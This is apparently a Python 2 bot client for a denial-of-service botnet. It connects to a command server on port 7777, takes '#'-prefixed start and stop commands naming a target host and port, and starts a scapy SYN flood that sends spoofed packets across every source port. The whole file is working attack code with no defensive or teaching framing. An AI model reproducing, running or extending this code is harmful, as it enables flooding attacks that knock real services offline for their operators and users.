import sys
import socket
import random
import argparse
from multiprocessing import Process
from scapy.all import *
import os
isworking = False
curProcess = None


def synFlood(tgt, dport):
    srcList = ['201.1.1.2', '10.1.1.102', '69.1.1.2', '125.130.5.199']
    for sport in range(1024, 65535):
        index = random.randrange(4)
        ipLayer = IP(src=srcList[index], dst=tgt)
        TcpLayer = TCP(sport=sport, dport=dport, flags='S')
        packet = ipLayer / TcpLayer
        send(packet)


def handleCmd(sock, parser):
    global curProcess
    while True:
        data = sock.recv(1024).decode('utf-8')
        if len(data) == 0:
            print 'data is empty'
            return
        if data[0] == '#':
            try:
                options = parser.parse_args(data[1:].split())
                mhost = options.host
                mport = options.port
                mcmd = options.cmd

                if mcmd.lower() == 'start':
                    if curProcess != None and curProcess.is_alive():
                        curProcess.terminate()
                        curProcess = None
                        os.system('clear')
                    print 'synflood is start'
                    p = Process(target=synFlood, args=(mhost, mport))
                    p.start()
                    curProcess = p
                elif mcmd.lower() == 'stop':
                    if curProcess.is_alive():
                        curProcess.terminate()
                        os.system('clear')
            except:
                print 'failed to exec cmd'


def main():
    p = argparse.ArgumentParser()
    p.add_argument('-H', dest='host', type=str)
    p.add_argument('-P', dest='port', type=int)
    p.add_argument('-C', dest='cmd', type=str)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', 7777))
        print 'connect sucess'
        handleCmd(s, p)
    except:
        print 'connect error'
        sys.exit(0)

if __name__ == '__main__':
    main()
